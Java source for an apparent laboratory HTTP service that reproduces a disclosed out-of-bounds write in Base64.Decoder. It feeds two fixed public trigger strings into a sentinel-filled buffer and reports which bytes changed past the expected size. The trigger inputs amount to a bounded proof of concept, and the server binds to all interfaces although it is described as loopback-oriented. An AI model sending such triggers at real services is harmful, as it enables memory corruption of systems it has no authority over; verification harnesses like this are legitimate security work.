import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import java.util.Locale;
import java.util.concurrent.Executors;

/**
 * Loopback-oriented CVE-2026-114938 laboratory service.
 *
 * The service only accepts the two public bounded trigger shapes disclosed by
 * Calif. It writes into a real 4 KiB array and measures bytes changed beyond
 * the size that Base64.Decoder would have allocated. It never executes a
 * command and is not a product exploit.
 */
public final class LabServer {
    private static final Base64.Decoder DECODER = Base64.getDecoder();
    private static final byte SENTINEL = (byte) 0x5a;
    private static final int TARGET_SIZE = 4096;
    private static final int MAX_BODY = 256;
    private static volatile int sink;

    private LabServer() {}

    public static void main(String[] args) throws Exception {
        warmUp();

        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "8080"));
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 32);
        server.createContext("/health", LabServer::health);
        server.createContext("/decode", LabServer::decode);
        server.setExecutor(Executors.newFixedThreadPool(4));
        server.start();

        System.out.printf(
            Locale.ROOT,
            "java2shell-lab listening on 0.0.0.0:%d runtime=%s label=%s%n",
            port,
            System.getProperty("java.runtime.version"),
            System.getenv().getOrDefault("LAB_LABEL", "unlabelled")
        );
    }

    private static void warmUp() {
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] target = new byte[TARGET_SIZE];
        for (int i = 0; i < 200_000; i++) {
            sink += DECODER.decode(valid, target);
        }
    }

    private static void health(HttpExchange exchange) throws IOException {
        if (!"GET".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "{\"error\":\"method_not_allowed\"}\n");
            return;
        }

        String body = String.format(
            Locale.ROOT,
            "{\"status\":\"ok\",\"runtime\":\"%s\",\"label\":\"%s\"}\n",
            json(System.getProperty("java.runtime.version")),
            json(System.getenv().getOrDefault("LAB_LABEL", "unlabelled"))
        );
        send(exchange, 200, body);
    }

    private static void decode(HttpExchange exchange) throws IOException {
        if (!"POST".equals(exchange.getRequestMethod())) {
            send(exchange, 405, "{\"error\":\"method_not_allowed\"}\n");
            return;
        }

        byte[] body = exchange.getRequestBody().readNBytes(MAX_BODY + 1);
        if (body.length > MAX_BODY) {
            send(exchange, 413, "{\"error\":\"body_too_large\"}\n");
            return;
        }

        String payload = new String(body, StandardCharsets.US_ASCII).strip();
        if (!isPublicTriggerShape(payload)) {
            send(exchange, 400,
                "{\"error\":\"only_public_bounded_trigger_shapes_are_accepted\","
                    + "\"accepted\":[\"A*64+=\",\"A*128+=\"]}\n");
            return;
        }

        ProbeResult result = probe(payload);
        String response = String.format(
            Locale.ROOT,
            "{\"status\":\"%s\",\"runtime\":\"%s\",\"input_length\":%d,"
                + "\"expected_output_size\":%d,\"decoder_rejected\":%s,"
                + "\"changed_past_expected\":%d,\"first_changed\":%d,"
                + "\"last_changed\":%d,\"claim\":\"oob_write_only_not_shell\"}\n",
            result.changedPastExpected > 0 ? "reproduced" : "not_reproduced",
            json(System.getProperty("java.runtime.version")),
            payload.length(),
            result.expectedSize,
            result.rejected,
            result.changedPastExpected,
            result.firstChanged,
            result.lastChanged
        );
        send(exchange, 200, response);
    }

    private static ProbeResult probe(String payload) {
        byte[] input = payload.getBytes(StandardCharsets.US_ASCII);
        byte[] target = new byte[TARGET_SIZE];
        Arrays.fill(target, SENTINEL);

        boolean rejected = false;
        try {
            DECODER.decode(input, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int expectedSize = decodedOutputLength(input);
        int changed = 0;
        int first = -1;
        int last = -1;
        for (int i = expectedSize; i < target.length; i++) {
            if (target[i] != SENTINEL) {
                changed++;
                if (first < 0) {
                    first = i;
                }
                last = i;
            }
        }
        return new ProbeResult(expectedSize, rejected, changed, first, last);
    }

    private static int decodedOutputLength(byte[] input) {
        int padding = 0;
        if (input.length > 0 && input[input.length - 1] == '=') {
            padding++;
        }
        if (input.length > 1 && input[input.length - 2] == '=') {
            padding++;
        }
        return 3 * (int) ((input.length + 3L) / 4L) - padding;
    }

    private static boolean isPublicTriggerShape(String payload) {
        if (!(payload.length() == 65 || payload.length() == 129) || !payload.endsWith("=")) {
            return false;
        }
        for (int i = 0; i < payload.length() - 1; i++) {
            if (payload.charAt(i) != 'A') {
                return false;
            }
        }
        return true;
    }

    private static void send(HttpExchange exchange, int status, String body) throws IOException {
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        exchange.getResponseHeaders().set("Content-Type", "application/json; charset=utf-8");
        exchange.getResponseHeaders().set("Cache-Control", "no-store");
        exchange.sendResponseHeaders(status, bytes.length);
        exchange.getResponseBody().write(bytes);
        exchange.close();
    }

    private static String json(String value) {
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private record ProbeResult(
        int expectedSize,
        boolean rejected,
        int changedPastExpected,
        int firstChanged,
        int lastChanged
    ) {}
}
